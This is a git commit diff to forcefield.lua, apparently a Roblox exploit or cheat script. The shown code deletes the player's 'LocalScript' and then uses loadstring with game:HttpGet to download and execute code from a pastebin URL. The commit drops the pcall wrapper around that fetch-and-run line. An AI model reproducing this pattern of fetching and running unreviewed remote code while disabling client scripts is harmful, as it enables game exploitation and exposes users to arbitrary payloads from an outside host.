32f130a57a919f0fec787672b2a9a7112514a525
Simoniko <52357715+Simoniko@users.noreply.github.com>
2023-09-06 20:09:45 +0200

    Update forcefield.lua

--- forcefield.lua
+++ forcefield.lua
@@ -35,7 +35,5 @@ pcall(function()
         if game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript") then
         game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript"):Destroy()
         end
-        pcall(function()
         loadstring(game:HttpGet("https://pastebin.com/raw/BMGbkQ71"))();
-        end)
 end)
